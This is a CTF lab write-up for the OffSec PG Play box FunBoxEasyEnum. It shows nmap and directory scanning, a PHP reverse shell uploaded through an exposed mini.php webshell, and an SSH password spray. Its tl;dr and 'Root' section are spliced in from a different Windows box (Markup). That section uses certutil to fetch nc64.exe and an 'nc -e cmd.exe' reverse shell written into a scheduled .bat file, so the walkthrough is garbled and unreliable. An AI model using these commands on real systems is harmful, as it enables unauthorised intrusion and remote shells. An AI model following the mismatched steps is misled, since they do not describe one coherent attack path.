---
title: "Offsec - PG Play - FunBoxEasyEnum"
date: 2025-10-24 12:00:00 -0700
categories: [CTF,Offsec]
tags: [Linux, phpmyadmin ]
---

![Markup](/assets/img/ctf/htb/very-easy/markup/1.png)

# Initial Intel
* Difficulty: Easy
* OS: Linux

# tl;dr
<details><summary>Spoilers</summary>
* SSH and a webserver on :80 are active<br/>
* default creds to get into the webapp<br/>
* View page source for a username & XXE vector<br/>
* Use Burspuite to intercept and edit the XML sent to the webapp <br/>
* use XXE to LFI the known user's SSH key<br/>
* SSH as user and enumerate C:\Log-Management for an editable .bat file<br/>
* transfer nc over and edit the .bat file to get admin shell
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/offsec/easy/FunBoxEasyEnum]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $funbox
```

Looks like SSH and a webserver are both available. 


```bash
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                              
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                   
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))                                                                                               
|_http-title: Apache2 Ubuntu Default Page: It works   
```

I don't see any exploits available based off this info. I'll enumerate the webapp next.

#### Webapp Enumeration

Navigating in-browser to the app returns a default Apache wepserver landing page.

![Webapp Landing Page](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/1.png)

I'll enumerate for interesting directories, pages, and files with *feroxbuster*

```bash
┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]                                                                                                                                                                
└─$ feroxbuster --url http://$funbox --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
                                                                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___                                                                                                                                                                       
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                                                        
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                                                       
by Ben "epi" Risher 🤓                 ver: 2.10.4                                                                                                                                                                       
───────────────────────────┬──────────────────────                                                                                                                                                                       
 🎯  Target Url            │ http://192.168.134.132                                                                                                                                                                      
 🚀  Threads               │ 50                                                                                                                                                                                          
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt                                                                                                                   
 💢  Status Code Filters   │ [404]                                                                                                                                                                                       
 💥  Timeout (secs)        │ 7                                                                                                                                                                                           
 🦡  User-Agent            │ feroxbuster/2.10.4                                                                                                                                                                          
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                                                          
 🔎  Extract Links         │ true                                                                                                                                                                                        
 💲  Extensions            │ [php, sh, txt, cgi, html, js, css, py, zip, aspx, pdf, docx, doc, md, log, htm, asp, do]                                                                                                    
 🏁  HTTP methods          │ [GET]                                                                                                                                                                                       
 🔃  Recursion Depth       │ 3                                                      

301      GET        9l       28w      323c http://192.168.134.132/phpmyadmin => http://192.168.134.132/phpmyadmin/                                                                                                      
.
.
.
200      GET        1l        2w       21c http://192.168.134.132/robots.txt                                                                                                                                             
.
.
.
200      GET      114l      263w     3828c http://192.168.134.132/mini.php
```

There are three finding worth exploring:

1. a /phpmyadmin directory
2. robots.txt
3. mini.php

Navigating to the phpmyadmin login page:

![phpmyadmin Login Page](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/2.png)

I tried several default creds, but could not get in. I can try a bruteforce later as a last resort. For now, I'll try the other interesting items.

Let's checkout the robots.txt file:

![robots.txt](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/3.png)

Interesting. There is a rule listed here:

```bash
Allow: Enum_this_Box
```

This implies there is a directory at http://$funbox/Enum_this_Box/ that can be further enumerated. Let's see if we can find anything with a targeted discovery scan:


```bash
┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]                                                                                                                                                                
└─$ feroxbuster --url http://$funbox/Enum_this_Box/ --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,h
tm,asp,do                                                                                                                                                                                                                
                                                                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___                                                                                                                                                                       
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                                                        
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                                                       
by Ben "epi" Risher 🤓                 ver: 2.10.4                                                                                                                                                                       
───────────────────────────┬──────────────────────                                                                                                                                                                       
 🎯  Target Url            │ http://192.168.134.132/Enum_this_Box/                                                                                                                                                       
 🚀  Threads               │ 50                                                                                                                                                                                          
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt                                                                                                                   
 💢  Status Code Filters   │ [404]                                                                                                                                                                                       
 💥  Timeout (secs)        │ 7                                                                                                                                                                                           
 🦡  User-Agent            │ feroxbuster/2.10.4                                                                                                                                                                          
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                                                          
 🔎  Extract Links         │ true                                                                                                                                                                                        
 💲  Extensions            │ [php, sh, txt, cgi, html, js, css, py, zip, aspx, pdf, docx, doc, md, log, htm, asp, do]                                                                                                    
 🏁  HTTP methods          │ [GET]                                                                                                                                                                                       
 🔃  Recursion Depth       │ 3                                                                                                                                                                                           
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                                                                                       
───────────────────────────┴──────────────────────                                                                                                                                                                       
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                                                                                      
──────────────────────────────────────────────────                                                                                                                                                                       
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                  
[#####>--------------] - 9m    319993/1198710 25m     found:0       errors:0                                                                                                                                             
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_134_132_Enum_this_Box_-1761504214.state ...                                                                                                                  
[#####>--------------] - 9m    320033/1198710 25m     found:0       errors:0                                                                                                                                             
[#####>--------------] - 9m    319466/1198691 569/s   http://192.168.134.132/Enum_this_Box/  
```

I tried multiple different wordlists here. All failed to enumerate anything. This seems to be a rabit hole...moving on.

## Foothold

I navigated to the last remaining interesting artifact: /mini.php

![mini.php webshell](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/5.png)

Ah yeah, we have an psuedo-webshell. Looks like we can upload/delete files to the webserver. There are a couple of things we could do here, but I'll try to upload a PHP revershell to get a foothold.

I'll use [Pentestmonkey's PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell)

Once downloaded I made changes to include my $attacker IP and port for my local listener.

![Revshell mods](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/6.png)

I upload the file under the same name and then start a local listener:

```bash
┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
└─$ sudo nc -lvnp 4444
[sudo] password for haunter: 
listening on [any] 4444 ...
connect to [192.168.45.209] from (UNKNOWN) [192.168.134.132] 33224
Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:03:21 up  1:04,  0 users,  load average: 0.00, 0.00, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@funbox7:/$ whoami
whoami
www-data
www-data@funbox7:/$ 

```

Great, we have a revshell. I upgrade my shell and check my user context.

### Foothold Recon

Let's check for users and then add them to users.txt locally:

```bash
# on $funbox
www-data@funbox7:/home$ ls
ls
goat  harry  karla  oracle  sally
```

```bash
# on $attacker
┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
└─$ cat users.txt 
goat
harry
karla
oracle
sally
```

## Lateral Movement / Privilege Escalation

Since I tried other basic manual enum techniques already, I'll get linPEAS on $funbox and see if it finds any privEsc vectors. In the meantime I'll try an SSH bruteforce with the usernames I found.

As I only have usernames at this point and no passwords, I find it best to *use the usernames as a password list first* before moving onto a password list like rockyou.

```bash
┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
└─$ nxc ssh $funbox -u users.txt -p users.txt --ignore-pw-decoding
SSH         192.168.134.132 22     192.168.134.132  [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
SSH         192.168.134.132 22     192.168.134.132  [+] goat:goat (Pwn3d!) Linux - Shell access!
```

To my surprise it actually got a hit with *goat:goat* 

## Root / SYSTEM

```bash 
# start a httpserver on your $attacker. My port is at :8000
PS C:\Log-Management>certutil -f urlcache http://10.10.14.18:8000/win/nc64.exe .\nc.exe
```

Start your local listener. Mine is set for :4444

```bash
┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
└─$ sudo rlwrap nc -lvnp 4444
[sudo] password for haunter: 
listening on [any] 4444 ...
```

Now I'll try to replace the contents of *job.bat*. NOTE: Due to how Powershell handles special characters/escaping, I had to exit Powershell and run the following from cmd instead:

```bash
PS C:\Log-Management> exit

daniel@MARKUP C:\Users\daniel>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.18 4444 > C:\LogManagement\job.bat
```

And then wait to see if there is a schedule to launch the revshell...

![Admin Shell](/assets/img/ctf/htb/very-easy/markup/admin.png)

Success. After collecting the administrator.txt flag we've completed Markup.


# Lessons Learned
* XML can lead to XXE / XEE, which can lead to LFI
* Enumerate odd directories. If we see custom .bat or .exe files, check permissions to see if we can edit the file
* Even if we can't see a process since it may be running as admin, context may provide clues it is scheduled to run as admin
* when edit files with piped input, cmd is preffered over Powershell
